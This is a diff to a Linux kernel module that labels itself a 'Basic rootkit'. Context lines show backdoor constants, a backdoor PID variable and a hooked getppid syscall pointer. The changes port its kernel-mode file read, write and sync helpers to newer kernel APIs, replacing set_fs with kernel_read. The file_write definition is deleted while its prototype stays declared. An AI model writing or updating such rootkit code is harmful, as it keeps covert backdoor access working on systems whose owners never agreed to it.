@@ -34,7 +34,6 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define MAGIC_BACKDOOR      1235
 #define FD_HACK_BACKDOOR    0x666
 #define MAX_PIDS            8
-#define MIN(a,b)            ((a < b) ? a : b)
 #define MAX_LINE_LEN        512
 
 static pid_t pid_backdoor = 0;
@@ -106,8 +105,8 @@ asmlinkage pid_t (*original_sys_getppid) (void);
 
 struct file *file_open(const char *path, int flags, int rights);
 int file_close(struct file *file);
-int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
-int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
+ssize_t file_read(struct file *file, loff_t offset, unsigned char *data, unsigned int size);
+ssize_t file_write(struct file * file, loff_t offset, unsigned char * data, unsigned int size);
 
 /**
  * \fn void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
@@ -311,20 +310,12 @@ static char * extract_line(const char * buf, char * line, size_t count)
  * */
 struct file *file_open(const char *path, int flags, int rights)
 {
-    struct file *filp = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
+    struct file *filp;
 
-    // on stocke l'ancien filesystem ici
-    oldfs  = get_fs();
-    set_fs(get_ds());
     filp = filp_open(path, flags, rights);
-    set_fs(oldfs);
-    if(IS_ERR(filp))
-    {
-        err = PTR_ERR(filp);
+    if (IS_ERR(filp))
         return NULL;
-    }
+
     return filp;
 }
  
@@ -348,43 +339,10 @@ int file_close(struct file *file)
  * \param size  : size of the storage buffer
  * \return number of bytes read
  * */
-int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
-                   unsigned int size)
+ssize_t file_read(struct file *file, loff_t offset,
+                  unsigned char *data, unsigned int size)
 {
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_read(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}
-
-/**
- * \fn      int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
- * \brief   Write into a file in kernel mode
- * \param file  : pointer to the struct file  to read
- * \param offset: position of the curser in opened file
- * \param data  : start pointer of the buffer to store data
- * \param size  : size of the storage buffer
- * \return number of bytes written
- * */
-int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
-                    unsigned int size)
-{
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_write(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
+    return kernel_read(file, data, size, &offset);
 }
 
 /**
@@ -393,10 +351,9 @@ int file_write(struct file * file, unsigned long long offset, unsigned char * da
  * \param file : file struct to synched
  * \return 0
  * */
-int file_sync(struct file * file)
+int file_sync(struct file *file)
 {
-    vfs_fsync(file, 0);
-    return 0;
+    return vfs_fsync(file, 0);
 }
 
 // Finish editing some files here
